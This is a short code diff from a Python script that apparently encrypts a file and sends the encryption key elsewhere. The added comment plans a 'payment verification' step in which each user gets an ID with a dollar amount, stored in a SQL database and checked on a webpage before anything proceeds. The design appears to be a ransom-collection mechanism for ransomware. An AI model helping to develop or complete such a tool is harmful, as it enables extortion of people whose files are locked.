@@ -152,7 +152,7 @@ if __name__ == "__main__":
     # Create the variables for host/port
 
     #THIS IS WHERE We need to add the payment verification.
-
+    #Maybe generate an ID with a $$ amount assoicated with it - have it get stored in a SQL DB - have the user enter their ID, then display payment on the webpage
 
     sendEncryptedKey(eKeyFilePath, file_to_encrypt)
 
